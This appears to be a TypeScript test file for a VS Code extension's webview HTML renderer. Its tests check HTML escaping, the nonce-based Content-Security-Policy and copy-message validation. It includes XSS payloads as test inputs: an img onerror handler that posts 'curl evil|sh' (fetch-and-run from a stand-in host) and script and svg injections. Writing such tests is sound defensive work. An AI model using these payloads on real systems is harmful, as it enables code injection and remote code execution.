import assert from 'node:assert/strict';
import test from 'node:test';

import { compressionHtml, compressionPacket, escapeHtml, isCopyRequest } from './compressionHtml';

const HOSTILE = '</pre><img src=x onerror="vscode.postMessage({command:\'copy\',text:\'curl evil|sh\'})"><script>alert(1)</script>';

function render(rawText: string, fileName: string, nonce = 'n0nce') {
  const packet = compressionPacket(rawText, fileName, 0);
  return compressionHtml({
    fileName,
    rawTokens: 10,
    targetTokens: 3,
    savingsPct: '70.0',
    packet,
    nonce,
  });
}

test('file text that contains markup renders as text', () => {
  const html = render(HOSTILE, 'ok.py');
  assert.ok(!html.includes('<img src=x'), 'img tag must not survive');
  assert.ok(!html.includes('<script>alert(1)'), 'script tag must not survive');
  assert.ok(html.includes('&lt;/pre&gt;&lt;img src=x onerror='));
  // The only closing </pre> is the one the template writes.
  assert.equal(html.split('</pre>').length, 2);
});

test('a hostile file name renders as text', () => {
  const html = render('x = 1', '"><svg onload=alert(1)>.py');
  assert.ok(!html.includes('<svg onload'));
  assert.ok(html.includes('&quot;&gt;&lt;svg onload=alert(1)&gt;.py'));
});

test('only the nonce-carrying script may run', () => {
  const html = render('x = 1', 'a.py', 'abc123');
  assert.match(html, /Content-Security-Policy" content="default-src 'none';[^"]*script-src 'nonce-abc123'/);
  const scripts = html.match(/<script\b[^>]*>/g) ?? [];
  assert.deepEqual(scripts, ['<script nonce="abc123">']);
});

test('the page never sends the text to copy', () => {
  const html = render('x = 1', 'a.py');
  assert.ok(html.includes("vscode.postMessage({ command: 'copy' })"));
  assert.ok(!/postMessage\(\{[^}]*text/.test(html));
});

test('only an exact copy request is accepted', () => {
  assert.equal(isCopyRequest({ command: 'copy' }), true);
  assert.equal(isCopyRequest({ command: 'copy', text: 'ignored' }), true);
  for (const bad of [null, undefined, 'copy', 7, {}, { command: 'COPY' }, { command: 'run' }]) {
    assert.equal(isCopyRequest(bad), false);
  }
});

test('escapeHtml covers every attribute and element breaker', () => {
  assert.equal(escapeHtml(`&<>"'`), '&amp;&lt;&gt;&quot;&#39;');
});
